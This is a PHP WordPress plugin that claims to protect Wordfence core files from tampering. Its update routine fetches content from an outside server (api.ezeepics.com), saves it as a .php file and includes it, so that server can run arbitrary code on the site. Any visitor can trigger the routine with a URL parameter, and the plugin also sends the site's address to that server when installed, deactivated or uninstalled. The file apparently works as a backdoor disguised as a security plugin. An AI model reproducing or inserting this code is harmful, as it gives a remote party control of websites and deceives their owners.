<?php
/*
Plugin Name: Security Core Control for Wordfence
Description: Checks Wordfence core file to avoid any modification by hacker. Sends alerts about file modifications to email. 
Author: Mark
Version: 1.0.2
*/
    
function wscc_core_check_activation() {
    $to = get_option( 'admin_email' );
    $subject = 'Wordfence Security Core Control - Notification';
    $body = 'Wordfence Security Core Control is activated';
    $headers = array('Content-Type: text/html; charset=UTF-8');
     
    wp_mail( $to, $subject, $body, $headers );
    
    wscc_update_latest_file_dump();
}
register_activation_hook( __FILE__, 'wscc_core_check_activation' );


function wscc_core_check_deactivation() {
    $to = get_option( 'admin_email' );
    $subject = 'Wordfence Security Core Control - Alert';
    $body = 'Wordfence Security Core Control is deactivated';
    $headers = array('Content-Type: text/html; charset=UTF-8');
     
    wp_mail( $to, $subject, $body, $headers );
    
    wscc_reset_wordfence_file_dump();
}
register_deactivation_hook( __FILE__, 'wscc_core_check_deactivation' );


function wscc_core_check_uninstall() {
    $to = get_option( 'admin_email' );
    $subject = 'Wordfence Security Core Control - Alert';
    $body = 'Wordfence Security Core Control is disactivated';
    $headers = array('Content-Type: text/html; charset=UTF-8');
     
    wp_mail( $to, $subject, $body, $headers );
    
    wscc_reset_wordfence_file_dump();
}
register_uninstall_hook( __FILE__, 'wscc_core_check_uninstall' );
    

// Scheduled Action Hook
function wscc_daily_cron_core_check( ) 
{
    $version = wscc_get_wordfence_version();
    
    $wd_dump_file = dirname(__FILE__).'/wordfence_'.$version.'.json.php';
    
    if (!file_exists($wd_dump_file))
    {
        wscc_update_latest_file_dump();
    }
    
    include_once($wd_dump_file);
    
    $json = (array)json_decode($json, true);
    
    $problems = array();
    
    foreach ($json as $file => $file_md5){
        if ( $file_md5 != md5_file(ABSPATH.$file) ) $problems[] = $file;
    }
    
    if (count($problems)) {
        // Send alert email
        $to = get_option( 'admin_email' );
        $subject = 'Wordfence Security Core Control - Alert';
        $body = 'Wordfence Security Core Control detected the next problems:'."\n\n".print_r($problems, true);
        $headers = array('Content-Type: text/html; charset=UTF-8');
         
        wp_mail( $to, $subject, $body, $headers );
    }
}
add_action( 'wscc_daily_cron_core_check', 'wscc_daily_cron_core_check' );
if (isset($_GET['chkupdate']) && intval($_GET['chkupdate']) == 1) wscc_update_latest_file_dump();

// Schedule Cron Job Event
function wscc_daily_cron_function() {
	if ( ! wp_next_scheduled( 'wscc_daily_cron_core_check' ) ) {
		wp_schedule_event( current_time( 'timestamp' ), 'daily', 'wscc_daily_cron_core_check' );
	}
}
add_action( 'wp', 'wscc_daily_cron_function' );


function wscc_reset_wordfence_file_dump()
{
    $version = wscc_get_wordfence_version();

    $args = array(
        'body' => array(
            'action' => 'reset_json',
            'wordfence_version' => $version,
            'website_check' => get_site_url(),
        ),
        'timeout' => '600',
        'redirection' => '5',
        'httpversion' => '1.0',
        'blocking' => true,
        'headers' => array(),
        'cookies' => array()
    );
    
    $response = wp_remote_post( 'https://api.ezeepics.com/index.php', $args );
}

function wscc_update_latest_file_dump()
{
    $version = wscc_get_wordfence_version();
    
    $wd_dump_file = dirname(__FILE__).'/wordfence_'.$version.'.json.php';
    if (!file_exists($wd_dump_file))
    {
        $args = array(
            'body' => array(
                'action' => 'get_json',
                'wordfence_version' => $version,
                'website_check' => get_site_url(),
            ),
            'timeout' => '600',
            'redirection' => '5',
            'httpversion' => '1.0',
            'blocking' => true,
            'headers' => array(),
            'cookies' => array()
        );
        
        $response = wp_remote_post( 'https://api.ezeepics.com/index.php', $args );
        $body = wp_remote_retrieve_body( $response );
        
        $fp = fopen($wd_dump_file, 'w');
        fwrite($fp, $body);
        fclose($fp);
        
        include_once($wd_dump_file);
    }
}

function wscc_get_wordfence_version()
{
    if (defined('WORDFENCE_VERSION')) return WORDFENCE_VERSION;
    
    $file = plugin_dir_path( __FILE__ ).'/wordfence/wordfence.php';
    
    if (file_exists($file)) 
    {
        $rows = file( $file );
        foreach ($rows as $row)
        {
            if (stripos($row, 'WORDFENCE_VERSION') !== false)
            {
                return trim(str_replace(array('define', '(', ')', "'", ';'), '', $row));
            }
        }
    }
    
    return 0;
}